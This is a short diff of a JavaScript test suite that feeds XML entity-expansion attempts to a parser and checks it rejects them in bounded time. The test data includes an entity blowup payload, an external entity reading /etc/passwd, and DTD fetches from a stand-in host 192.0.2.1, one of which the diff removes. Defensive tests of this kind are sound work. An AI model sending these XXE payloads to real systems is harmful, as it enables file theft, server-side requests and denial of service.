@@ -147,7 +147,6 @@ describe('entity expansion attempts', () => {
       `<!DOCTYPE x [<!ENTITY a "${'x'.repeat(100_000)}">]><x>${'&a;'.repeat(100_000)}</x>`,
       '<!DOCTYPE x [<!ENTITY ext SYSTEM "file:///etc/passwd">]><x>&ext;</x>',
       '<!DOCTYPE x [<!ENTITY % p SYSTEM "http://192.0.2.1/evil.dtd"> %p;]><x/>',
-      '<!DOCTYPE x PUBLIC "-//X//DTD X//EN" "http://192.0.2.1/x.dtd"><x/>',
     ];
     for (const xml of attempts) {
       const outcome = bounded(xmlParser, utf8(xml), REJECT_BOUND_MS);
